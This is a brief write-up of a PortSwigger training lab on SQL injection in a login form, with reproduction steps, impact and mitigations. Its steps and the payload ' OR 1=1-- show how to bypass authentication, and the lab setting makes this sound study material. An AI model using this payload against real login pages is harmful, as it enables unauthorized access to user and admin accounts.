# SQL Injection - Login page bypass.

# Vulnerability overview
This lab contains a SQL injection vulnerability in the login function, allowing to login as another user or admin.

# Steps to Reproduce

**Lab Link** >> https://portswigger.net/web-security/sql-injection/lab-login-bypass

*Navigate to*
* /login

*Test injection point*
* username: '
* password: test
→ Application returns server error (confirms injection)

*Bypass authentication using payload*
* username: ' OR 1=1--
* password: test
Submit request → Login successful without valid credentials

# Payload Used
' OR 1=1--

# Impact
Attacker can bypass authentication and gain unauthorized access to user accounts, including admin-level access.

# Tools Used
* Browser
* Burp Suite (optional for interception)

# Mitigation

* Use parameterized queries
* Implement proper input validation
* Avoid dynamic SQL queries
